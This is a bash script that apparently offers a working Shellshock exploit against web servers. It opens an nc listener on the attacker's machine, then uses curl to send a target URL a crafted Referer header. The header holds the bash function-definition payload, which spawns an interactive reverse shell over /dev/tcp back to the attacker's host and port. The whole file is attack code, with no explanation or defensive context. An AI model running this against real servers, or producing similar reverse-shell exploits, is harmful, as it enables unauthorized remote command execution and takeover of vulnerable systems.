#!/bin/bash
#
# Basic shell shock reverse shell exploit 
# 0x10F8

if [ $# -ne 3 ]; then
	echo "[-] Usage: ${0} <target_url> <lhost> <lport>"
	exit 1
fi

TARGET=$1
LHOST=$2
LPORT=$3

# Start the listener for the reverse shell in a seperate terminal
start_reverse_shell() {
	local port=$1
	echo "[+] Starting reverse shell on port ${port}"
	gnome-terminal -q -- /bin/bash -c "nc -lvnp $port"
}

# Run the exploit
exploit_target() {
	local target_url=$1
	local lhost=$2
	local lport=$3
	local header_payload="Referer:() { :;}; /bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1"
	echo "[+] Sending exploit to $target_url"
	curl --max-time 2 -s --header "${header_payload}" $target_url > /dev/null
}
start_reverse_shell $LPORT
exploit_target $TARGET $LHOST $LPORT 
